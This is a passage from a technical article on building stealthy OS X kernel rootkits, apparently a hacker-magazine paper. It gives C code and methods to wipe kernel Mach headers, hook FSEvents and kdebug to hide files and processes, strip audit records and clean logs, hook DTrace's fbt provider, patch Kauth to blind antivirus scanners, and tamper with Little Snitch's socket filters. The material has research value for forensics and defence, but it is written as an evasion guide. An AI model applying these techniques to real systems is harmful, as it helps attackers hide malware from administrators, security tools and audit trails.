include the current kernel ASLR slide). With this information we just need to
find out the total size of the header and nuke it:

int nuke_mach_header(mach_vm_address_t address)
{
	struct mach_header *mh = (struct mach_header_64*)address;
    uint32_t header_size = 0;
    if (mh->magic == MH_MAGIC_64)
    {
        header_size = mh->sizeofcmds + sizeof(struct mach_header_64);
    }
    else return 1;
    // we have total header size and startup address
    // disable CR0 write protection
    disable_wp();
    memset((void*)my_address, 0, header_size);
    enable_wp();
    return 0;
}

Instead of just zero'ing the header you could fill it with random junk data for
fun. You can even mangle data from the other commands (LINKEDIT, LC_SYMTAB,
LC_DYSYMTAB, LC_UUID). For example, there are no symbol stubs in kernel -
symbols are solved when kernel extension is loaded and calls are made
directly to the referenced symbol. This is a problem because it can be used to
detect valid code and get hints on what it is trying to do. One can generate a
table of all kernel symbols and use it to find cross references in kernel memory
and dump that code. 

Function pointers can help to hide our code - the question is how easy or not it
is to bootstrap the rootkit to search the required symbols. One solution can be
to use the techniques described before to find the symbols and then mangle the
bootstrap code - only leave in memory code using function pointers. 
Be creative, try to reduce your footprint to the maximum :-).

----[ 6.2 - Attacking DTrace and other instrumentation features

Mac OS X has many instrumentation features available. There are at least DTrace,
FSEvents, Kauth, kdebug, and TrustedBSD. TrustedBSD's original goal is not
instrumentation related but can be used (or abused) for this purpose. Kauth is
explored in Section 6.3 with AV-Monster II, while all the others in the next
subsections.

------[ 6.2.1 - FSEvents

FSEvents is an API for file system notification. Applications register for
events that are interested in and receive them via /dev/fsevents. A file system
monitor can be built on top of this - the usual suspects [13] and [14] offer a
good explanation about its internals and code samples. Jonathan Levin has a
"filemon" tool available at his book companion web site.

The responsibility to add the events belongs to the function add_fsevent()
[bsd/vfs/vfs_fsevents.c]. It is a bit long vararg function and I do not want to
spend space and time analysing it. Amit Singh has a nice figure on page 1421 of
[14] with functions that add events. For example, the open syscall can generate
a file create event (FSE_CREATE_FILE). 
The next diagram shows the how the event is added:

open() -> open_nocancel() -> open1()    [bsd/vfs/vfs_syscalls.c]
                               |
                               v
[bsd/vfs/vfs_vnops.c]    vn_open_auth() -> vn_open_auth_do_create()
                                                    |
                                                    v
[bsd/vfs/vfs_fsevents.c]       add_fsevent() <- need_fsevent()

In this particular case we could hijack need_fsevent(), match the file we want
to hide and return 0 to avoid event generation. In many cases there is a direct
call to add_fsevent() so we also need to hijack it. Inside our new function we
need to retrieve the necessary information to match the event we want to hide
and return EINVAL or 0 in those cases. You should study the add_fsevent()
function to understand how to implement this. I do not think there is much value
in describing it here - there are more (interesting) topics to cover.

------[ 6.2.2 - kdebug
       
kdebug is another (rather obscure) kernel trace facility used only by Apple
utils such as fs_usage and sc_usage. Documentation is poor and the best
references are those utils source code and a few pages by Levin [13].
The relevant include file is bsd/sys/kdebug.h. kdebug is implemented in kernel
functions that might produce relevant events using KERNEL_DEBUG() macro. The
kernel functions involved (in that macro) are kernel_debug() and
kernel_debug_internal() (with always inline attribute).

A 32 bits integer is used for the debug messages, with the following format:
 ----------------------------------------------------------------------
|              |               |                               |Func   |
| Class (8)    | SubClass (8)  |          Code (14)            |Qual(2)|
 ----------------------------------------------------------------------
 
For example, filesystem operations use class DBG_FSYSTEM (3) and different
subclasses to filter between different operations such as read and writes to
filesystem, vnode operations, HFS events, etc (consult kdebug.h include).

Macros exist to encode the integer for each available class. Using BSD class as
an example:
#define KDBG_CODE(Class, SubClass, code) (((Class & 0xff) << 24) | ((SubClass &
0xff) << 16) | ((code & 0x3fff)  << 2))
#define BSDDBG_CODE(SubClass, code) KDBG_CODE(DBG_BSD, SubClass, code)

Grep'ing XNU source code for BSDDBG_CODE will show where kdebug is implemented
in all BSD related functions. The fs_usage util traces the file system related
system calls (its source is located in system_cmds-550.10 package). 
For example, it contains the following code for open() syscall:
#define BSC_open                0x040C0014

If we look at kdebug's include we have the following Class and SubClass codes:
#define DBG_BSD                 4
#define DBG_BSD_EXCP_SC         0x0C    /* System Calls */

Open is syscall #5 and it matches the code: (0x040C0014 & 0x3FFF) >> 2 = 0x5

Grep'ing for the DBG_BSD_EXCP_SC SubClass will land us into
bsd/dev/i386/systemcalls.c - the file that implements the C portion of syscalls
code. kdebug's tracing of syscalls entry and exit can be found at unix_syscall64
using two macros that call kernel_debug():
(...)
KERNEL_DEBUG_CONSTANT_IST(KDEBUG_TRACE, 
                BSDDBG_CODE(DBG_BSD_EXCP_SC, code) | DBG_FUNC_START,
                (int)(*ip), (int)(*(ip+1)), (int)(*(ip+2)), (int)(*(ip+3)), 0);
(...)
error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
(...)
KERNEL_DEBUG_CONSTANT_IST(KDEBUG_TRACE, 
            BSDDBG_CODE(DBG_BSD_EXCP_SC, code) | DBG_FUNC_END,
            error, uthread->uu_rval[0], uthread->uu_rval[1], p->p_pid, 0);
(...)

The easiest way to disable tracing of BSD related functions (besides patching
kernel_debug to just return) is to modify the calls to kernel_debug() and
reroute them to our own function. The disassembler makes this extremely easy, so
much that I implemented code for each call to kernel_debug() to have its own
trampoline (there is really no need for such thing!). Sample function to disable
all BSD syscall traces:

void
tfc_kernel_debug(uint32_t debugid, uintptr_t arg1, uintptr_t arg2, uintptr_t
arg3, uintptr_t arg4, __unused uintptr_t arg5)
{
 // solve the symbol of the original function
 static void (*_kernel_debug)(uint32_t debugid, uintptr_t arg1, uintptr_t arg2,
uintptr_t arg3, uintptr_t arg4, __unused uintptr_t arg5) = NULL;
 if (_kernel_debug == NULL)
  _kernel_debug = (void*)solve_kernel_symbol(&g_kernel_info, "_kernel_debug");

 // do not let fs_usage/sc_usage trace any BSD* system calls
 if ( (debugid >> 24) == DBG_BSD) return;
 else _kernel_debug(debugid, arg1, arg2, arg3, arg4, 0);
}

This patch will be suspicious when fs_usage and/or sc_usage are used because no
BSD system calls will be traced and screen output will be very low. kdebug's
implementation poses some problems to distinguish between cases to hide or not.
Its buffers are very small and this is easily noticed if you peak at fs_usage or
sc_usage code (verify the lookup() [bsd/vfs/vfs_lookup.c] kernel function to see
how fs_usage gets the path name for syscalls such as open()).

Fortunately for us there is a easy way to accomplish this using current_proc() -
it returns a proc structure for the currently executing process. With this
information we can retrieve the process name from the proc structure (p_comm
field, max size 16) and match against the processes we do not want traced. 
A code snippet for a simple check to hide vmware-tools-daemon:

struct proc *p = current_proc();
// MAXCOMLEN == 16, we could hash always to MAXCOMLEN to avoid strlen call
uint32_t hash = hash_name(&p->p_comm[0], strlen(&p->p_comm[0]));
static uint32_t hidehash = 0;
if (hidehash == 0) hidehash = hash_name("vmware-tools-daemon", MAXCOMLEN);
if (hash == hidehash ) return;
else _kernel_debug(debugid, arg1, arg2, arg3, arg4, 0);

The basic blocks to override kdebug are presented, implementation details are
left to the attached sample code and to you.

One final word of caution. The interception of Mach syscalls at kdebug gives
some problems and the hooking is very unstable (read kernel panics). This is
particularly exacerbated with the zombies rootkit feature later described. The
attached code has been written to support that feature but at time of writing I
still had no time to research the Mach problem - the code just ignores that
class.

------[ 6.2.3 - TrustedBSD

TrustedBSD is a project that started in FreeBSD and was ported to OS X in
Leopard. It enables a series of (interesting) security features, the most famous
one being the OS X/iOS sandbox. Its implementation is done by adding "hooks" in
critical kernel functions. Policy modules can be written to receive events from
these "hooks" and act on them if necessary/desirable.
One easy application is to create a runtime file system checker for critical
folders. The app monitors LaunchDaemons and notify the user if a new file was
added in there, which is a not so frequent operation and a favourite spot for
malware to make itself persistent (oh, this was a good opportunity to use APT
buzzword!). It can be used for evil purposes - the same "hooks" can increase
privileges or hide files [25].

Using an example with the open syscall (to be used later with in Kauth section):

open() -> open_nocancel() -> open1()
                               |
                               v
                         vn_open_auth() -> vn_authorize_open_existing()
                                                    |
                                                    v
                                           mac_vnode_check_open()
                                                    |
                                                    v
                                                MAC_CHECK()
                                                    |
                                                    v
                                           call policy, if registered

The vnode check handler that we can install has the following prototype:
typedef int mpo_vnode_check_open_t(
        kauth_cred_t cred,
        struct vnode *vp,
        struct label *label,
        int acc_mode);

Our handler will receive a pointer to the vnode structure and make it possible
to dump the filename and even transverse the full path (remember that vnodes
exist in a linked list).

MAC_CHECK() is a macro that will route the request to the policy modules. It is
a bit like sysent table where there is a list called mac_policy_list that holds
function pointers. A presentation by Andrew Case on Mac memory forensics [26]
analyses how to find malicious TrustedBSD modules using this list against a
sample I created (rex the wonder dog). It is worth to check his slides for other
Mac memory forensics tips.

The available policy checks can be found at bsd/security/mac_framework.h, and
their implementation is in the different source files in the same folder. What
interests us is that mac_* functions are always called so there is a
point of entry that can be used. The mac_* functions contain all the
necessary/available information since they are the ones always calling and
passing the parameters to the policy modules via MAC_CHECK() macro.

To attack this we can use the same old story: hook those functions, or attack
the mac_policy_list using the syscall handler concept, or something else.
When loading the rootkit it might also be useful to lookup the policy list to
verify if there is anything else installed other than default modules. The
system owner might be a bit smarter than the vast majority ;-).

------[ 6.2.4 - Auditing - Basic Security Module

The auditing features available from the Basic Security Module Implementation
are not really instrumentation but since their purpose is to track user and
process actions we should be interested in understanding and tweak them to our
evil purposes.
Auditing is not fully enabled by default due to its (potentially) considerable
performance hit and disk space usage (oh, I miss those PCI-DSS meetings).
To modify its configuration you need to edit /etc/security/audit_control. The
two interesting fields are flags and naflags (flags for events that can be
matched to a user, naflags for those who can't). Event classes are defined in
/etc/security/audit_class (description can be found at [27] and [28]). For
example, if "pc" class is configured audit will log exec() and its arguments.

Let's move to what really matters for us, evil stuff!
Auditing is implemented with macros [bsd/security/audit/audit.h] inside BSD and
Mach system calls (and some other places). The following code snippet is from
unix_syscall64 implementation, where entry and exit macros are placed before the
syscall function to be executed is called:

AUDIT_SYSCALL_ENTER(code, p, uthread);
error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
AUDIT_SYSCALL_EXIT(code, p, uthread, error);

About the contents of entry macro:
/*
 * audit_syscall_enter() is called on entry to each system call.  It is
 * responsible for deciding whether or not to audit the call (preselection),
 * and if so, allocating a per-thread audit record.  audit_new() will fill in
 * basic thread/credential properties.
 */

The exit macro is the interesting one because it calls audit_syscall_exit():
/*
 * audit_syscall_exit() is called from the return of every system call, or in
 * the event of exit1(), during the execution of exit1().  It is responsible
 * for committing the audit record, if any, along with return condition.
 */

When committed, the audit record will be added to an audit queue and removed
from the user thread structure (struct uthread, field uu_ar [bsd/sys/user.h]).

void
audit_syscall_exit(unsigned int code, int error, __unused proc_t proc,
    struct uthread *uthread) {
(...)
        audit_commit(uthread->uu_ar, error, retval);
out:
        uthread->uu_ar = NULL;
}

The commit function:
void audit_commit(struct kaudit_record *ar, int error, int retval) {
(..)
        TAILQ_INSERT_TAIL(&audit_q, ar, k_q); // add to queue
        audit_q_len++;
        audit_pre_q_len--;
        cv_signal(&audit_worker_cv); // signal worker who commits to disk
        mtx_unlock(&audit_mtx);
}

By default in OS X, almost everything is disabled excepting logging and
authentication to obtain higher privileges. The command "praudit /dev/auditpipe"
(as root, of course) can be used to live audit events. Run the command and login
via ssh, or lock and unlock the console to see these events. 

Syscall exit or audit commit functions can be temporarily patched to test if they
are the right places, and yes they are. Removing the call to audit_commit() or
patching it with a ret removes any trace of audit events in logs. There are four
references to commit in OS X 10.8.2 (3 calls, 1 jump):
- audit_syscall_exit
- audit_mach_syscall_exit
- audit_proc_coredump
- audit_session_event

To have granular control over the auditing process is a bit more complicated.
There is not always enough information available to distinguish between the
cases we want to hide at audit_commit(). For example, if process auditing is
enabled, the fork1() function calls audit like this:
AUDIT_ARG(pid, child_proc->p_pid);

This will call the function responsible to set the audit record field:

void audit_arg_pid(struct kaudit_record *ar, pid_t pid)
{
    ar->k_ar.ar_arg_pid = pid;
    ARG_SET_VALID(ar, ARG_PID);
}

The problem here is that we do not have (yet) enough information about this
fork; we are not sure (yet) if it is the process we want to hide or some other
process. A different tactic must be used! Because there is an events queue we
can hijack the worker responsible for those commits to disk, audit_worker()
[bsd/security/audit/audit_worker.c].
The missing piece is how to correlate all events we are interested in. Luckily
for us (and the auditor in particular) there is a session id in audit record
structure [bsd/security/audit/audit_private.h]:
pid_t  ar_subj_asid; /* Audit session ID */

With this information we just need to hold the queue commit to disk until enough
information to find the correct session ID is available. When we have it we can
edit the queue and remove all the entries that match that session ID.

Last but not least, there is a critical task left! Auditing logs must be cleaned
in case auditing was already properly configured. The bad news is that you will
have to do this dirty work yourself. Do not forget that the logs are in binary
format and OpenBSM's source at [29] can be helpful (praudit outputs XML format
so it might be a good starting point).

------[ 6.2.5 - DTrace

DTrace is a fantastic dynamic tracing framework introduced by Sun in Solaris and
available in Mac OS X since Leopard. It can be used to trace in real-time almost
every corner of kernel and user processes with minimum performance impact.
An experienced system administrator can use its power to assist in discovering
strange (aka malicious) behaviour. There are different providers that can trace
almost every function entry and exit, BSD syscalls and Mach traps, specific
process, virtual memory, and so on. The two most powerful providers against
rootkits are syscall and fbt (function boundary). We will see how they are
implemented and how to modify them to hide rootkit activity. A good design and
implementation overview is provided by [23] (Google is your friend) and usage
guide at [24].

------[ 6.2.5.1 - syscall provider

This provider allows to trace every BSD system call entry and return (the
provider for Mach traps is mach_trap). A quick example that prints the path
argument being passed to the open() syscall:
# dtrace -n 'syscall::open:entry 
{
    printf("opening %s", copyinstr(arg0));
}'
dtrace: description 'syscall::open:entry' matched 1 probe
CPU     ID                    FUNCTION:NAME
  0    119                       open:entry opening /dev/dtracehelper
  0    119                       open:entry opening
/usr/share/terminfo/78/xterm-256color
  0    119                       open:entry opening /dev/tty
  0    119                       open:entry opening /etc/pf.conf

The syscall provider is useful to detect syscall handler manipulation but
not the function pointers modification at sysent table. To understand why let's
delve into its implementation.

This provider is implemented by rewriting the system call table when a probe is
enabled, which in practice is the same operation as sysent hooking. The
interesting source file is bsd/dev/dtrace/systrace.c. It contains a global
pointer called systrace_sysent - a DTrace related structure that will hold the
original system call pointer and some other info.

Things start happening at systrace_provide(). Here systrace_sysent is allocated
and all necessary information copied from the original sysent table
(systrace_init). Then internal DTrace probe information is added.

DTrace's philosophy is of zero probe effect when disabled so there are functions
that replace and restore the sysent table entries. There is a struct called
dtrace_pops_t which contains provider's operations. Syscall provider has the
following:
static dtrace_pops_t systrace_pops = {
        systrace_provide,
        NULL,
        systrace_enable,
        systrace_disable,
        NULL,
        NULL,
        NULL,
        systrace_getarg,
        NULL,
        systrace_destroy
};

systrace_enable() will modify sysent function pointers and redirect them to
dtrace_systrace_syscall(). Code snippet responsible for this:
(...)
 lck_mtx_lock(&dtrace_systrace_lock);
 if (sysent[sysnum].sy_callc == systrace_sysent[sysnum].stsy_underlying) 
 {
    vm_offset_t dss = (vm_offset_t)&dtrace_systrace_syscall;
    ml_nofault_copy((vm_offset_t)&dss, (vm_offset_t)&sysent[sysnum].sy_callc,
sizeof(vm_offset_t));
 }
 lck_mtx_unlock(&dtrace_systrace_lock);
(...)

Attaching a kernel debugger and inserting a breakpoint on systrace_enable()
confirms this (keep in mind all these values include ASLR slide of 0x24a00000):

Before:
gdb$ print *(struct sysent*)(0xffffff8025255840+5*sizeof(struct sysent))
$12 = {
  sy_narg = 0x3, 
  sy_resv = 0x0, 
  sy_flags = 0x0, 
  sy_call = 0xffffff8024cfc210,          <- open syscall, sysent[5]
  sy_arg_munge32 = 0xffffff8024fe34f0, 
  sy_arg_munge64 = 0, 
  sy_return_type = 0x1, 
  sy_arg_bytes = 0xc
}

dtrace_systrace_syscall is located at address 0xFFFFFF8024FDC630.

After enabling a 'syscall::open:entry' probe:
gdb$ print *(struct sysent*)(0xffffff8025255840+5*sizeof(struct sysent))
$13 = {
  sy_narg = 0x3, 
  sy_resv = 0x0, 
  sy_flags = 0x0, 
  sy_call = 0xffffff8024fdc630,       <- now points to dtrace_systrace_syscall
  sy_arg_munge32 = 0xffffff8024fe34f0, 
  sy_arg_munge64 = 0, 
  sy_return_type = 0x1, 
  sy_arg_bytes = 0xc
}

To recall DTrace's flow:
  User                          Kernel
open() -|-> unix_syscall64() -> dtrace_systrace_syscall -> open() syscall 

What are the conclusions from all this? If only the sysent table function
pointers are modified by the rootkit, DTrace will be unable to directly detect
the rootkit using syscall provider. The modified pointer will be copied by
DTrace and return to it. DTrace is blind to the original function because it
does not exist anymore in the table, only inside our modified version.

If we modify the syscall handler as described in 2.6 and do not update the
sysent references in DTrace related functions then DTrace usage will signal the
potential presence of a rootkit. DTrace is still referencing the original sysent
table and will modify it but the syscall handler is not. The result is that
DTrace syscall provider will never receive any event. Conclusion: don't forget
to fix those references, although the functions that need to be patched are all
static.

------[ 6.2.5.2 - fbt provider

fbt stands for function boundary tracing and allows tracing function entry
and exit of almost all kernel related functions (there is a small list of
untraceable functions called critical_blacklist [bsd/dev/i386/fbt_x86.c]).

The possibilities to detect malicious code using this provider are higher due to
its design and implementation. An example using rubilyn rootkit is the best way
to demonstrate this:
#dtrace -s /dev/stdin -c "ls /"
fbt:::entry
/pid == $target/
{
}
^D

Searching output for getdirentries64, without rootkit:
  0  99661             unix_syscall64:entry 
  0  97082  kauth_cred_uthread_update:entry 
  0  91985            getdirentries64:entry 
  0  92677        vfs_context_current:entry 

Now with rootkit loaded:
  0  99661             unix_syscall64:entry 
  0  97082  kauth_cred_uthread_update:entry 
  0   2119        new_getdirentries64:entry  <- hooked syscall!!!
  0  91985            getdirentries64:entry  <- original function
  0  92677        vfs_context_current:entry 

A very simple trace is able to detect both the hooked syscall and the call to
original getdirentries64. Houston, we have a rootkit problem!

DTrace's fbt design and implementation are very interesting so let me "briefly"
go thru it to find a way to hide the rootkit.

fbt's design is explained in [23]:
"On x86, FBT uses a trap-based mechanism that replaces one of the instructions
in the sequence that establishes a stack frame (or one of the instructions in
the sequence that dismantles a stack frame) with an instruction to transfer
control to the interrupt descriptor table (IDT). 
The IDT handler uses the trapping instruction pointer to look up the FBT probe
and transfers control into DTrace. Upon return from DTrace, the replaced
instruction is emulated from the trap handler by manipulating the trap stack."

The source files we should focus on are bsd/dev/i386/fbt_x86.c and
bsd/dev/dtrace/fbt.c.

DTrace's OS X implementation is done using an illegal instruction opcode, which
is (usually) patched into the instruction that sets the base pointer (EBP/RBP). 
The instruction is emulated inside DTrace and not re-executed as it happens
in debuggers using int3 breakpoints.

Memory dump example with getdirentries64:
Before activating the provider:
gdb$ x/10i 0xFFFFFF8024D01C20
0xffffff8024d01c20:  55                            push   rbp
0xffffff8024d01c21:  48 89 e5                      mov    rbp,rsp
0xffffff8024d01c24:  41 56                         push   r14
0xffffff8024d01c26:  53                            push   rbx

After:
# dtrace -n fbt::getdirentries64:entry

gdb$ x/10i 0xFFFFFF8024D01C20
0xffffff8024d01c20:  55                            push   rbp
0xffffff8024d01c21:  f0 89 e5                      lock mov ebp,esp <- patched
0xffffff8024d01c24:  41 56                         push   r14
0xffffff8024d01c26:  53                            push   rbx

The function that does all the work to find the patch location is
__provide_probe_64() [bsd/dev/i386/fbt_x86.c] (FBT_PATCHVAL defines the illegal
opcode byte).

Patching is done at fbt_enable() [bsd/dev/dtrace/fbt.c]:
if (fbt->fbtp_currentval != fbt->fbtp_patchval) 
{
    (void)ml_nofault_copy((vm_offset_t)&fbt->fbtp_patchval,
(vm_offset_t)fbt->fbtp_patchpoint, sizeof(fbt->fbtp_patchval));                 
              
    fbt->fbtp_currentval = fbt->fbtp_patchval;
    ctl->mod_nenabled++;
}

The following diagram shows the trap handling of the illegal instruction:

Activate fbt Provider
       |
       v
  fbt_enable()
       |
       v
Invalid instruction
   exception
-------|-----------[ osfmk/x86_64/idt64.s ]
       v
  idt64_invop()
       |
       v
 hndl_alltraps()
       |
       v
trap_from_kernel()
-------|-----------[ osfmk/i386/trap.c ]
       v
  kernel_trap()
-------|-----------[ bsd/dev/i386/fbt_x86.c ]
       v                                                
fbt_perfCallback()             (...)                    .-> emulate -> continue
-------|-----------[ bsd/dev/dtrace/dtrace_subr.c ]     | instruction
       v                                                |
  dtrace_invop()                                        |
-------|-----------[ bsd/dev/i386/fbt_x86.c ]           |
       v                                                |
   fbt_invop()                                          |
-------|-----------[ bsd/dev/dtrace/dtrace.c ]          |
       v                                                |
  dtrace_probe()                                        |
       |                                                |
       v                                                |
__dtrace_probe()                                        |
       |                                                |
       v                                                |
     (...) ---------------------------------------------´
       
Dtrace is activated inside kernel_trap():
#if CONFIG_DTRACE
    if (__improbable(tempDTraceTrapHook != NULL)) {
        if (tempDTraceTrapHook(type, state, lo_spp, 0) == KERN_SUCCESS) {
            /*
             * If it succeeds, we are done...
             */
            return;
        }
    }
#endif /* CONFIG_DTRACE */

tempDTraceTrapHook is just a function pointer, which in fbt provider case points
to fbt_perfCallback [bsd/dev/i386/fbt_x86.c].
The latter is responsible for calling the DTrace functionality and
emulating the patched instruction. The emulations depends on the type of patch
that was made - prologue (entry) or epilogue (return), and
which instruction was patched. These can be:
- MOV RSP, RBP
- POP RBP
- LEAVE
- Also NOPs used by the sdt provider (statically defined tracing)

This information is stored inside DTrace internal structures and returned by the
call to dtrace_invop():
emul = dtrace_invop(saved_state->isf.rip, (uintptr_t *)saved_state,
saved_state->rax);

It is not possible to just patch this call because the emul value determines the
type of emulation that needs to be executed after.

dtrace_invop is used by fbt and sdt providers and does nothing more than calling
function pointers contained in dtrace_invop_hdlr linked list
[bsd/dev/dtrace/dtrace_subr.c].

Continuing through the diagram...

fbt_invop is a good candidate to hijack and hide whatever we want from DTrace.
This can be done via a trampoline or modifying the function pointer contained
in dtrace_invop_hdlr list (symbol available in kernel). 
From what I could test this list is initialised with the pointer to fbt_invop()
before any calls are made to fbt provider. In principle we can modify it without
waiting for initial DTrace execution.

int fbt_invop(uintptr_t addr, uintptr_t *state, uintptr_t rval)
{
    fbt_probe_t *fbt = fbt_probetab[FBT_ADDR2NDX(addr)];
    
    for (; fbt != NULL; fbt = fbt->fbtp_hashnext) {
        if ((uintptr_t)fbt->fbtp_patchpoint == addr) {

            if (fbt->fbtp_roffset == 0) {
                x86_saved_state64_t *regs = (x86_saved_state64_t *)state;

                CPU->cpu_dtrace_caller = *(uintptr_t
*)(((uintptr_t)(regs->isf.rsp))+sizeof(uint64_t)); // 8(%rsp)
                /* 64-bit ABI, arguments passed in registers. */
                dtrace_probe(fbt->fbtp_id, regs->rdi, regs->rsi, regs->rdx,
regs->rcx, regs->r8); // <---------- call to dtrace functionality --------
                CPU->cpu_dtrace_caller = 0;
            } else {
                dtrace_probe(fbt->fbtp_id, fbt->fbtp_roffset, rval, 0, 0, 0);
                CPU->cpu_dtrace_caller = 0;
            }
            return (fbt->fbtp_rval); <- the emul value
        }
    }
    return (0);
}

fbt_invop finds probed address information stored in fbt_probetab array and
enters DTrace probe code. The return value that is needed for the emulation is
stored inside the structure.
To fiddle with DTrace we can emulate this function or create a modified
fbt_perfCallback, adding conditions to hide our own addresses. It contains no
private symbols so this is an easy task.

Next, is a potential implementation of a hooked fbt_perfCallback function.
Please notice that all the necessary code is not implemented. It is a mix of
code and "algorithms".

kern_return_t
fbt_perfCallback_hooked(int trapno, x86_saved_state_t *tagged_regs,
                        uintptr_t *lo_spp, __unused int unused2)
{
    kern_return_t retval = KERN_FAILURE;
    x86_saved_state64_t *saved_state = saved_state64(tagged_regs);
    
    if (FBT_EXCEPTION_CODE == trapno && !IS_USER_TRAP(saved_state)) 
    {
        uintptr_t addr = saved_state->isf.rip;
        // XXX: verify if we want to hide this address
        //      remember that addr here is where illegal instruction occurred
        //      so our list must contain that info
        int addr_is_to_hide = hide_from_fbt(addr); // implement this
        if (addr_is_to_hide) 
        {
            // XXX: find fbt_probetab symbol here so we can use it next
        
            // and now get the search starting point
            fbt_probe_t *fbt = fbt_probetab[FBT_ADDR2NDX(addr)];
            // find the structure for current addr
            for (; fbt != NULL; fbt = fbt->fbtp_hashnext) 
            {
                if ((uintptr_t)fbt->fbtp_patchpoint == addr) 
                {
                    // XXX: emulate all code inside fbt_perfCallback here
                    // except call to dtrace_invop()
                    // this is the code that is inside the first IF conditions
                    // in the original function
                    // a couple of symbols might need to be solved, easy!
                }
            }
            // add fail case here ? shouldn't be necessary unless a big f*ckup
            // occurs inside DTrace structures
        }
        // nothing to hide so call the original function
        else
        {   
            kern_return_t ret = KERN_FAILURE;
            // XXX: don't forget we need to solve this symbol
            ret = fbt_perfCallback(trapno, tagged-regs, lo_spp, unused2);
            return ret;
        }
    }
    return retval;
}

Functions that we want to hide from DTrace will never reach its probe system,
effectively hiding them. The performance impact should be extremely low unless
there are too many functions to hide, and hide_from_fbt() takes too long to
execute.

----[ 6.3 - AV-Monster II

AV-Monster is a (old, Feb'12) PoC that exploits the Kauth interface used by OS X
anti-virus solutions [21]. Pardon me for bringing an old subject to this paper
but it perfectly illustrates an attack on Kauth, and also because AV vendors, as
far as I know, did nothing or very little regarding this problem.

Apple recommends in [22] that anti-virus install Kauth listeners - they can
receive file events and pass them to the scan engine. The problem is that this
creates a single point of failure that we can (easily) exploit to bypass the
scan engine and remain undetectable (AV detection effectiveness discussion is
out of scope ;-)).

A very basic AV scanning workflow is:
Execute file -> Kauth generates event -> AV kext listener -> AV scan engine

It illustrates at least two distinct possibilities to *easily* bypass the
anti-virus. One is to patch Kauth and the other to patch the kext listener.
The old PoC code just NOPs the listener callback to render it inoperative - the
scanning engine stops receiving any events. This is too noisy! A stealth
implementation should just hijack that step and hide the files we want to, as it
is done with hiding files in the filesystem.

This time let me show you how to attack Kauth's. The example will be based on
the KAUTH_FILEOP_OPEN action and open() syscall. To avoid unnecessary browsing
of XNU sources, this is the worflow up to the interesting point:

open() -> open_nocancel() -> open1()    [ bsd/vfs/vfs_syscalls.c ]
                               |
                               v
[ bsd/vfs/vfs_vnops.c ]  vn_open_auth() -> vn_open_auth_finish()
                                                    |
                                                    v
[ bsd/kern/kern_authorization.c ]        kauth_authorize_fileop()         
                                                    |
                                                    v
                                        kauth_authorize_action()
                                                    |
                                                    v
                                             listener callback
                                          
I do not want to spam you with code but allow me to reprint the fileop function:
int
kauth_authorize_fileop(kauth_cred_t credential, kauth_action_t action, uintptr_t
arg0, uintptr_t arg1)
{
        char            *namep = NULL;
        int             name_len;
        uintptr_t       arg2 = 0;

        /* we do not have a primary handler for the fileop scope so bail out if
         * there are no listeners.
         */
        if ((kauth_scope_fileop->ks_flags & KS_F_HAS_LISTENERS) == 0) {
                return(0);
        }

        if (action == KAUTH_FILEOP_OPEN || action == KAUTH_FILEOP_CLOSE ||
action == KAUTH_FILEOP_EXEC) {
            /* get path to the given vnode as a convenience to our listeners. */
                namep = get_pathbuff();
                name_len = MAXPATHLEN;
                if (vn_getpath((vnode_t)arg0, namep, &name_len) != 0) {
                        release_pathbuff(namep);
                        return(0);
                }
                if (action == KAUTH_FILEOP_CLOSE) {
                        arg2 = arg1;  /* close has some flags that come in via
arg1 */
                }
                arg1 = (uintptr_t)namep;
        }      
        kauth_authorize_action(kauth_scope_fileop, credential, action, arg0,
arg1, arg2, 0);

        if (namep != NULL) {
                release_pathbuff(namep);
        }
        return(0);
}

The purpose of this function is to retrieve some useful data to the listener. In
this case it is the vnode reference of the file and its full path.
Apple's documentation confirms it:

KAUTH_FILEOP_OPEN — Notifies that a file system object (a file or directory) has
been opened. arg0 (of type vnode_t) is a vnode reference. arg1 (of type (const
char *)) is a pointer to the object's full path.

It is clear now that this is a great place to hijack and hide files we do not
want the AV to scan (or some other listener - this is also a good feature for a
file monitor). We just need to verify if current file matches our list and
return 0 if positive, else call the original code (all these functions are not
static so we can easily find the symbols).

And that's it. Simple, uh? :-)

----[ 6.4 - Little Snitch

Little Snitch is a popular application firewall that can blow up the rootkit
cover if network communications are needed and its not taken care of (nobody
likes a snitch!). Socket filters is the OS X feature that enables Little Snitch
to easily intercept and control (network) sockets without need for hooking or
any other (unstable/dubious) tricks. They can filter inbound or outbound traffic
on a socket and also out-of-band communication [17].

The installation of a socket filter is done using the sflt_register() function,
for each domain, type, and protocol socket. Little Snitch loops to install the
filter in all possible socket combinations.

extern errno_t sflt_register(const struct sflt_filter *filter,
                             int domain,
                             int type,
                             int protocol);

The interesting detail of sflt_register() is the sflt_filter structure
[bsd/sys/kpi_socketfilter.h]. It contains a series of callbacks for different
socket operations:

struct sflt_filter {
 sflt_handle                     sf_handle;
 int                             sf_flags;
 char                            *sf_name;
 sf_unregistered_func            sf_unregistered;
 sf_attach_func                  sf_attach; // handles attaches to sockets.
 sf_detach_func                  sf_detach;
 sf_notify_func                  sf_notify;
 sf_getpeername_func             sf_getpeername;
 sf_getsockname_func             sf_getsockname;
 sf_data_in_func                 sf_data_in; // handles incoming data.
 sf_data_out_func                sf_data_out;
 sf_connect_in_func              sf_connect_in; // handles inbound connections.
 sf_connect_out_func             sf_connect_out;
 sf_bind_func                    sf_bind; // handles binds.
 (...)
}

History repeats itself and once again the easiest way is to hook the function
pointers and do whatever we want. Little Snitch driver (it's an I/O Kit driver
and not a kernel extension) loads very early so hooking sflt_register() and
modifying the structure on the fly is not very interesting. We need to lookup
the structure in kernel memory and modify it.

Many different socket filters can be attached to the same socket so there must
be a data structure holding this information. The interesting source file is
bsd/kern/kpi_socketfilter.c, where a tail queue is created and referenced using
a static variable sock_filter_head.

struct socket_filter {
        TAILQ_ENTRY(socket_filter)      sf_protosw_next;
        TAILQ_ENTRY(socket_filter)      sf_global_next;
        struct socket_filter_entry      *sf_entry_head;

        struct protosw                  *sf_proto;
        struct sflt_filter              sf_filter;
        u_int32_t                       sf_refcount;
};

TAILQ_HEAD(socket_filter_list, socket_filter);
static struct socket_filter_list        sock_filter_head;

There are a few functions referencing sock_filter_head and the disassembler can
be helpful to find the correct location (sflt_attach_internal() is a good
candidate). Using gdb attached to kernel and sock_filter_head address:

gdb$ print *(struct socket_filter_list*)0xFFFFFF800EAAC9F8
$1 = {
  tqh_first = 0xffffff8014811f08, 
  tqh_last = 0xffffff8014898e18
}

